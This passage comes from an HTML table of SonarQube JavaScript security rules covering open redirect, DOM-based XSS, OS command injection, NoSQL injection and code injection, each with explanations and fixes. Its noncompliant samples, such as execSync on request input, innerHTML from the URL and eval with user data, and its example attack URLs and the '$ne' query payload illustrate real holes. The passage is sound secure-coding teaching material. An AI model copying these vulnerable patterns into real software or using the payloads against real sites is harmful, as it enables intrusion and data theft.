              jssecurity:S5146
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Open redirection occurs when an application uses user-controllable data to redirect users to a URL.</p>
<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as
<code>https://trusted.example.com?url=evil.example.com</code>, to redirect the victim to his evil domain.</p>
<p>Tricking users into sending the malicious HTTP request is usually the main task of exploiting an open redirection. Often, it requires an attacker
to build a credible pretext to prevent suspicions from the victim.<br></p>
<p>Attackers commonly use open redirect exploits in mass phishing campaigns.</p>
<h3>What is the potential impact?</h3>
<p>If an attacker tricks a user into opening a link of his choice, the user is redirected to a domain controlled by the attacker.</p>
<p>From then on, the attacker can perform various malicious actions, some more impactful than others.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Domain Mirroring</h4>
<p>A malicious link redirects to an attacker’s controlled website mirroring the interface of a web application trusted by the user. Due to the
similarity in the application appearance and the apparently trustable clicked hyperlink, the user struggles to identify that they are browsing on a
malicious domain.<br></p>
<p>Depending on the attacker’s purpose, the malicious website can leak credentials, bypass Multi-Factor Authentication (MFA), and reach any
authenticated data or action.</p>
<h4>Malware Distribution</h4>
<p>A malicious link redirects to an attacker’s controlled website that serves malware. On the same basis as the domain mirroring exploitation, the
attacker develops a spearphishing or phishing campaign with a carefully crafted pretext that would result in the download and potential execution of a
hosted malicious file.<br> The worst-case scenario could result in complete system compromise.</p>
<h2>How to fix it in Express.js</h2>
<h3>Code examples</h3>
<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used
to redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
server.get('/redirect', (request, response) =&gt; {

   response.redirect(request.query.url); // Noncompliant
});
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
server.get('/redirect', (request, response) =&gt; {

   if (request.query.url.startsWith("https://www.example.com/")) {
      response.redirect(request.query.url);
   }
});
</pre>
<h3>How does this work?</h3>
<p>Built-in framework methods should be preferred as, more often than not, these provide additional security mechanisms. Usually, these built-in
methods are engineered for internal page redirections. Thus, they might not be the solution for the reader’s use case.</p>
<p>In case the application strictly requires external redirections based on user-controllable data, this could be done using the following
alternatives:</p>
<ol>
  <li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls). </li>
  <li> Using an allow-list approach in case the destination URLs are multiple but limited. </li>
  <li> Adding a customized page to which users are redirected, warning about the imminent action and requiring manual authorization to proceed. </li>
</ol>
<h3>Pitfalls</h3>
<h4>The trap of 'StartsWith' and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>
<p>If the validation string does not contain a terminating path separator, the Open Redirect vulnerability remains; only the exploitation technique
changes.</p>
<p>Thus, a validation like <code>startsWith("https://example.com")</code> or an equivalent with the regex <code>^https://example\.com.*</code> can be
exploited with the following URL <code>https://example.com.malicious.io</code>. The practice of taking over domains that maliciously look like
existing domains is widespread and is called <a href="https://en.wikipedia.org/wiki/Cybersquatting">Cybersquatting</a>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/601">CWE-601 - URL Redirection to Untrusted Site ('Open Redirect')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S5696">
              jssecurity:S5696
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>DOM-based cross-site scripting (XSS) occurs in a web application when its client-side logic reads user-controllable data, such as the URL, and then
uses this data in dangerous functions defined by the browser, such as <code>eval()</code>, without sanitizing it first.</p>
<p>When well-intentioned users open a link to a page vulnerable to DOM-based XSS, they are exposed to several attacks targeting their browsers.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but also arbitrary code that can
be interpreted by the user’s browser, such as HTML, CSS, or JavaScript.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting this vulnerability.</p>
<h4>Website defacement</h4>
<p>An attacker can use the vulnerability to change the target web application’s content as they see fit. Therefore, they might replace the website’s
original content with inappropriate content, leading to brand and reputation damage for the web application owner. It could additionally be used in
phishing campaigns, leading to the potential loss of user credentials.</p>
<h4>User impersonation</h4>
<p>When a user is logged into a web application and opens a malicious link, the attacker can steal that user’s web session and carry out unauthorized
actions on their account. If the credentials of a privileged user (such as an administrator) are stolen, the attacker might be able to compromise all
of the web application’s data.</p>
<h4>Theft of sensitive data</h4>
<p>Cross-site scripting allows an attacker to extract the application data of any user that opens their malicious link. Depending on the application,
this can include sensitive data such as financial or health information. Furthermore, by injecting malicious code into the web application, it might
be possible to record keyboard activity (keylogger) or even request access to other devices, such as the camera or microphone.</p>
<h4>Chaining XSS with other vulnerabilities</h4>
<p>In many cases, bug hunters and attackers can use cross-site scripting vulnerabilities as a first step to exploit more dangerous
vulnerabilities.</p>
<p>For example, suppose that the admin control panel of a web application contains an SQL injection vulnerability. In this case, an attacker could
find an XSS vulnerability and send a malicious link to an administrator. Once the administrator opens the link, the SQL injection is exploited, giving
the attacker access to all user data stored in the web application.</p>
<h2>How to fix it in DOM API</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to DOM-based cross-site scripting because it uses unsanitized URL parameters to alter the DOM of its webpage.</p>
<p>Because the user input is not sanitized here and the used DOM property is vulnerable to XSS, it is possible to inject arbitrary code in the user’s
browser through this example.</p>
<h4>Noncompliant code example</h4>
<p>The <a href="https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML"><code>Element.innerHTML</code></a> property is used to replace the
contents of the <code>root</code> element with user-supplied contents. The <code>innerHTML</code> property does not sanitize its input, thus allowing
for code injection.</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
const rootEl = document.getElementById('root');
const queryParams = new URLSearchParams(document.location.search);
const input = queryParams.get("input");

rootEl.innerHTML = input; // Noncompliant
</pre>
<h4>Compliant solution</h4>
<p>The <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/innerText"><code>HTMLElement.innerText</code></a> property does not
create DOM elements out of its input, rather treating its input as a string. This makes it a safe alternative to <code>Element.innerHTML</code>
depending on the use case.</p>
<pre data-diff-id="1" data-diff-type="compliant">
const rootEl = document.getElementById('root');
const queryParams = new URLSearchParams(document.location.search);
const input = queryParams.get("input");

rootEl.innerText = input;
</pre>
<h3>How does this work?</h3>
<p>In general, one should limit the use of dangerous properties and methods, such as <code>Element.innerHTML</code> or <code>Document.write()</code>,
as there exist many ways for an attacker to exploit their usage. Instead, prefer the usage of safe alternatives such as
<code>HTMLElement.innerText</code> or <code>Node.textContent</code>. Furthermore, frameworks such as React or Vue.js will automatically escape
variables used in views, making it much harder to accidentally write vulnerable code.</p>
<p>If these options are not possible, sanitization of the attacker-controllable input should be preferred.</p>
<h4>Sanitization of user-supplied data</h4>
<p>By systematically encoding data that is written to the DOM, it is possible to prevent XSS attacks. In this case, the goal is to leave the data
intact from the end user’s point of view but make it uninterpretable by web browsers.</p>
<p>However, selecting an encoding that is guaranteed to be safe can be a complex task. XSS exploitation techniques vary depending on the HTML context
where malicious input is injected. As a result, a combination of HTML encoding, URL encoding and JavaScript escaping may be required, depending on the
context. <a href="https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html">OWASP’s DOM-based XSS Prevention Cheat
Sheet</a> goes into more detail about the required sanitization.</p>
<p>Though browsers do not yet provide any direct API to do this sanitization, the <a href="https://github.com/cure53/DOMPurify">DOMPurify library</a>
offers extensive functionality to prevent XSS and has been tested by a large user base.</p>
<h3>Pitfalls</h3>
<h4>The limits of validation</h4>
<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the
recommended approach.</p>
<p>For example, filtering out user inputs based on a denylist will never fully prevent XSS vulnerabilities from being exploited. This practice is
sometimes used by web application firewalls. Time and time again, malicious users are able to find the exploitation payload that will defeat the
filters of these firewalls.</p>
<p>Another common approach is to parse HTML and strip sensitive HTML tags. Again, this denylist approach is vulnerable by design: maintaining a list
of sensitive HTML tags is very difficult in the long run.</p>
<h4>Modification after sanitization</h4>
<p>Caution should be taken if the user-supplied data is further modified <strong>after</strong> this data was sanitized. Doing so might void the
effects of sanitization and introduce new XSS vulnerabilities. In general, modification of this data should occur beforehand instead.</p>
<h3>Going the extra mile</h3>
<h4>Content Security Policy</h4>
<p>With a defense-in-depth security approach, a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy</a> (CSP) can
be added through the <code>Content-Security-Policy</code> HTTP header, or using a <code>&lt;meta&gt;</code> element. The CSP aims to mitigate XSS
attacks by instructing client browsers not to load data that does not meet the application’s security requirements.</p>
<p>Server administrators can define an allowlist of domains that contain valid scripts, which will prevent malicious scripts (not stored on one of
these domains) from being executed. If script execution is not needed on a certain webpage, it can also be blocked altogether.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md">OWASP Cheat
  Sheet</a> - XSS Prevention Cheat Sheet </li>
  <li> <a href="http://www.webappsec.org/projects/articles/071105.shtml">webappsec.org</a> - DOM Based Cross Site Scripting or XSS of the Third Kind
  </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://www.sonarsource.com/blog/ghost-admin-takeover/">Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S2076">
              jssecurity:S2076
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>OS command injections occur when applications build command lines from untrusted data before executing them with a system shell.<br> In that case,
an attacker can tamper with the command line construction and force the execution of unexpected commands. This can lead to the compromise of the
underlying operating system.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting an OS command injection vulnerability will be able to execute arbitrary commands on the underlying operating system.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul>
  <li> download the internal server’s data, most likely to sell it </li>
  <li> modify data, send malware </li>
  <li> stop services or exhaust resources (with fork bombs for example) </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to command injections because it is using untrusted inputs to set up a new process. Therefore an attacker can
execute an arbitrary program that is installed on the system.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const { execSync } = require('child_process')

cmd = req.query.cmd
execSync(cmd) // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const { spawnSync } = require('child_process')

const cmdId = parseInt(req.query.cmdId)
let host = req.query.host
host = typeof host === "string"? host : "example.org"

const allowedCommands = [
    {exe:"/bin/ping", args:["-c","1","--"]},
    {exe:"/bin/host", args:["--"]}
]
const cmd = allowedCommands[cmdId]
spawnSync(cmd.exe, cmd.args.concat(host))
</pre>
<h3>How does this work?</h3>
<p>Allowing users to execute operating system commands generally creates more problems than it solves.</p>
<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br> Therefore, our first suggestion is to
avoid using OS commands in the first place.<br> However, if the application requires running OS commands with user-controlled data, here are some
security suggestions.</p>
<h4>Pre-Approved commands</h4>
<p>If the application aims to execute only a small number of OS commands (for example, <code>ls</code>, <code>pwd</code>, and <code>grep</code>), the
cleanest way to avoid this problem is to validate the input before using it in an OS command.</p>
<p>Create a list of authorized and secure commands that you want the application to be able to execute. Use absolute paths to avoid any ambiguity.<br>
If a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p>Depending on the number of commands you want the application to support, the list can be either a regex string or any array type. If you use
regexes, choose simple regexes to avoid ReDOS attacks. For example, you can accept only a specific set of executables, by using
<code>^/bin/(ls|pwd|grep)$</code>.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<p>In the example compliant code, a static list of trusted commands is used. Users are only allowed to submit an index in this array in place of a
full command name.</p>
<h4>Neutralize special characters</h4>
<p>If the application is to execute complex commands that cannot be controlled thanks to pre-approved lists, the cleanest approach is to use special
sanitization components, such as <code>child_process.spawn</code>.</p>
<p>The library helps you to get rid of common dangerous characters, such as:</p>
<ul>
  <li> <code>&amp;</code> </li>
  <li> <code>|</code> </li>
  <li> <code>;</code> </li>
  <li> <code>$</code> </li>
  <li> <code>&gt;</code> </li>
  <li> <code>&lt;</code> </li>
  <li> <code>`</code> </li>
  <li> <code>\</code> </li>
  <li> <code>!</code> </li>
</ul>
<p>If user input is to be included in the arguments of a command, the application must ensure that dangerous options or argument delimiters are
neutralized.<br> Argument delimiters count <code>'</code>, <code>-</code> and spaces.</p>
<p>For example, the <code>find</code> command from UNIX supports the dangerous argument <code>-exec</code>.<br> In this case, option processing can be
terminated with a string containing <code>--</code> or with special options. For example, <code>git</code> supports <code>--end-of-options</code> <a
href="https://github.blog/2019-11-03-highlights-from-git-2-24/#tidbits">since its version 2.24</a>.</p>
<p>In the example compliant code, the <code>spawn</code> function from <code>child_process</code> is used in place of its less secure
<code>exec</code> counterpart. It accepts command arguments as an array and performs a proper escaping of its element before building the command line
to run.</p>
<h4>Disable shell integration</h4>
<p>In most cases, command execution libraries propose two ways to execute external program: with or without shell integration.</p>
<p>When shell integration is allowed, an attacker with control over the command arguments can simply execute additional external programs using system
shell features. For example, on Unix, command pipelining (<code>|</code>) or string interpolation (<code>$()</code>, <code>&lt;()</code>, etc.) can be
used to break out of a command call.</p>
<p>Therefore, it is generally preferable to disable shell integration.</p>
<p>The <code>spawn</code> function that is used in the example compliant code disables shell integration by default.</p>
<h3>Pitfalls</h3>
<h4>Loose typing</h4>
<p>Because JavaScript is a loosely typed language, extra care should be taken when accepting user-controlled parameters. Indeed, some methods, that
can be used to sanitize untrusted parameters, sometimes accept both objects and object arrays.</p>
<p>For example, the <code>Array.concat</code> function accepts an array as argument and will append all of its elements to its target. When an
untrusted parameter is an array, while a single string was expected, using <code>concat</code> to build a command argument list can result in an
arbitrary argument injection.</p>
<p>It is therefore of prime importance to check the type of untrusted parameters before processing them.</p>
<p>In the above compliant code example, the ambiguous <code>concat</code> function is used. However, a type check has been introduced to prevent any
unexpected issue.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html">OWASP, OS Command Injection Defense
  Cheaty Sheet</a> </li>
  <li> <a href="https://gtfobins.github.io/#+shell">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li>
  <li> <a href="https://lolbas-project.github.io/#">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/78">CWE-78 - Improper Neutralization of Special Elements used in an OS Command</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S6105">
              jssecurity:S6105
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Open redirection occurs when an application uses user-controllable data to build URLs used during redirects.</p>
<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as
<code>https://trusted.example.com/redirect?url=evil.com</code>, to redirect the victim to their evil domain.</p>
<p>Open redirection is most often used to trick users into browsing to a malicious domain that they believe is safe. As such, attackers commonly use
open redirect exploits in mass phishing campaigns.</p>
<h3>What is the potential impact?</h3>
<p>An attacker can use this vulnerability to redirect a user from a trusted domain to a malicious domain controlled by the attacker. At that point,
the attacker can perform various attacks, such as phishing.</p>
<p>Below are some scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Phishing</h4>
<p>Suppose the attacker creates a malicious website that mirrors the interface of the trusted website. In that case, they can use the open redirect
vulnerability to lead the user to this malicious site.</p>
<p>Due to the similarity in the application appearance and the supposedly trustable hyperlink, the user fails to identify that they are browsing on a
malicious domain. From here, an attacker can capture the user’s credentials, bypass Multi-Factor Authentication (MFA), and take over the user’s
account on the trusted website.</p>
<h4>Malware distribution</h4>
<p>By leveraging the domain mirroring technique explained above, the attacker could also create a website that hosts malware. A user who is unaware of
the redirection from a trusted website to this malicious website might then download and execute the attacker’s malware. In the worst case, this can
lead to a complete system compromise for the user.</p>
<h4>JavaScript injection (XSS)</h4>
<p>In certain circumstances, an attacker can use DOM-based open redirection to execute JavaScript code. This can lead to further exploitation in the
trusted domain and has consequences such as the compromise of the user’s account.</p>
<h2>How to fix it in DOM API</h2>
<h3>Code examples</h3>
<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used
to redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>
<h4>Noncompliant code example</h4>
<p>The following example is vulnerable to open redirection through the following URL:
<code>https://example.com/redirect?url=https://evil.com</code>;</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
const queryParams = new URLSearchParams(document.location.search);
const redirectUrl = queryParams.get("url");
document.location = redirectUrl; // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const queryParams = new URLSearchParams(document.location.search);
const redirectUrl = queryParams.get("url");

if (redirectUrl.startsWith("https://www.example.com/")) {
    document.location = redirectUrl;
}
</pre>
<h3>How does this work?</h3>
<p>Most client-side frameworks, such as <code>Vue.js</code> or <code>React.js</code>, provide built-in redirection methods. Those should be preferred
as they often provide additional security mechanisms. However, these built-in methods are usually engineered for internal page redirections. Thus,
they might not solve the reader’s use case.</p>
<p>In case the application strictly requires external redirections based on user-controllable data, the following should be done instead:</p>
<ol>
  <li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls.) </li>
  <li> Using an allowlist approach in case the destination URLs are multiple but limited. </li>
  <li> Adding a dynamic confirmation dialog, warning about the imminent action and requiring manual authorization to proceed to the actual
  redirection. </li>
</ol>
<h3>Pitfalls</h3>
<h4>The trap of <code>String.startsWith</code> and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator character (i.e., a <code>/</code>) as the last character</strong>.</p>
<p>When this character is not present, attackers may be able to register a specific domain name that both passes validation and is controlled by
them.</p>
<p>For example, when validating the <code>https://example.com</code> domain, suppose an attacker owns the <code>https://example.evil</code> domain. If
the prefix-based validation is implemented incorrectly, they could create a <code>https://example.com.example.evil</code> subdomain to abuse the
broken validation.</p>
<p>The practice of taking over domains that maliciously look like existing domains is widespread and is called <a
href="https://en.wikipedia.org/wiki/Cybersquatting">cybersquatting</a>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/601">CWE-601 - URL Redirection to Untrusted Site ('Open Redirect')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S5147">
              jssecurity:S5147
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>NoSQL injections occur when an application retrieves untrusted data and inserts it into a database query without sanitizing it first.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application that is vulnerable to NoSQL injection:<br> After discovering the injection point, attackers insert data into
the vulnerable field to execute malicious commands in the affected databases.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Identity spoofing and data leakage</h4>
<p>In the context of simple query logic breakouts, a malicious database query enables privilege escalation or direct data leakage from one or more
databases.<br> This threat is the most widespread impact.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br> This threat is particularly insidious if the
attacked organization does not maintain a disaster recovery plan (DRP) as missing data can disrupt the regular operations of an organization.</p>
<h4>Chaining NoSQL injections with other vulnerabilities</h4>
<p>Attackers who exploit NoSQL injections rely on other vulnerabilities to maximize their profits.<br> Most of the time, organizations overlook some
defense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple
attacks with great impact:</p>
<ul>
  <li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li>
  <li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE). </li>
</ul>
<h2>How to fix it in MongoDB</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to a NoSQL injection because the database query is built using untrusted JavaScript objects that are extracted
from user inputs.</p>
<p>Here the application assumes the user-submitted parameters are always strings, while they might contain more complex structures. An array or
dictionary input might tamper with the expected query behavior.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const { MongoClient } = require('mongodb');

function (req, res) {
    let query = { user: req.query.user, city: req.query.city };

    MongoClient.connect(url, (err, db) =&gt; {
        db.collection("users")
        .find(query) // Noncompliant
        .toArray((err, docs) =&gt; { });
    });
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const { MongoClient } = require('mongodb');

function (req, res) {
    let query = { user: req.query.user.toString(), city: req.query.city.toString() };

    MongoClient.connect(url, (err, db) =&gt; {
        db.collection("users")
        .find(query)
        .toArray((err, docs) =&gt; { });
    });
}
</pre>
<h3>How does this work?</h3>
<h4>Use only plain string values</h4>
<p>With MongoDB, NoSQL injection can arise when attackers are able to inject objects in the query instead of plain string values. For example, using
the object <code>{ $ne: "" }</code> in a field of a <code>find</code> query, will return every entry where the field is not empty.</p>
<p>Some JavaScript application servers enable "extended" syntax that serializes URL query parameters into JavaScript objects or arrays. This allows
attackers to control all the fields of an object. In express.js, this "extended" syntax <a
href="https://expressjs.com/en/4x/api.html#express.urlencoded">is enabled by default</a>.</p>
<p>Before using any untrusted value in a MongoDB query, make sure it is a plain string and not a JavaScript object or an array.</p>
<p>In some cases, this will not be enough to protect against all attacks and strict validation needs to be applied (see the "Pitfalls" section)</p>
<h3>Pitfalls</h3>
<h4>Code execution</h4>
<p>When untrusted data is used within query operators such as <code>$where</code>, <code>$accumulator</code>, or <code>$function</code> it usually
results in JavaScript code execution vulnerabilities.</p>
<p>Therefore, untrusted values should not be used inside these query operators unless they are properly validated.</p>
<p>For more information about MongoDB code execution vulnerabilities, see rule <a href='/organizations/sopra-steria/rules?open=typescript%3AS5334&rule_key=typescript%3AS5334'>S5334</a>.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://blog.sonarsource.com/nosql-injections-in-rocket-chat/">SonarSource, NoSQL Injections in Rocket.Chat 3.12.1</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/943">CWE-943 - Improper Neutralization of Special Elements in Data Query Logic</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S5334">
              jssecurity:S5334
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Code injections occur when applications allow the dynamic execution of code instructions from untrusted data.<br> An attacker can influence the
behavior of the targeted application and modify it to get access to sensitive data.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting a dynamic code injection vulnerability will be able to execute arbitrary code in the context of the vulnerable
application.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process that executes the code
runs with root privileges, and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul>
  <li> download the internal server’s data, most likely to sell it </li>
  <li> modify data, send malware </li>
  <li> stop services or exhaust resources (with fork bombs for example) </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of code injections and <strong>misconfiguration</strong> of:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to arbitrary code execution because it dynamically runs JavaScript code built from untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
function (req, res) {
    let operation = req.query.operation
    eval(`product_${operation}()`) // Noncompliant
    res.send("OK")
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
const allowed = ["add", "remove", "update"]

let operationId = req.query.operationId
const operation = allowed[operationId]
eval(`product_${operation}()`)
res.send("OK")
</pre>
<h3>How does this work?</h3>
<p>Allowing users to execute code dynamically generally creates more problems than it solves.</p>
<p>Anything that can be done via dynamic code execution can usually be done via a language’s native SDK and static code.<br> Therefore, our suggestion
is to avoid executing code dynamically.<br> If the application requires the execution of dynamic code, additional security measures must be taken.</p>
<h4>Dynamic parameters</h4>
<p>When the untrusted values are only expected to be values used in standard processing, it is generally possible to provide them as parameters of the
dynamic code. In that case, care should be taken to ensure that only the <strong>name</strong> of the untrusted parameter is passed to the dynamic
code and not that its value is expanded into it. After that, the dynamic code will be able to safely access the untrusted parameter content and
perform the processing.</p>
<h4>Allow list</h4>
<p>When the untrusted parameters are expected to contain operators, function names or other reflection-related values, best practices would encourage
using an allow list. This one would contain a list of accepted safe values that can be used as part of the dynamic code.</p>
<p>When receiving an untrusted parameter, the application would verify its value is contained in the configured allow list. If it is present, the
parameter is accepted. Otherwise, it is rejected and an error is raised.</p>
<p>Another similar approach is using a binding between identifiers and accepted values. That way, users are only allowed to provide identifiers, where
only valid ones can be converted to a safe value.</p>
<p>The example compliant code uses such a binding approach.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://blog.sonarsource.com/moodle-remote-code-execution/">SonarSource, Evil Teacher: Code Injection in Moodle</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
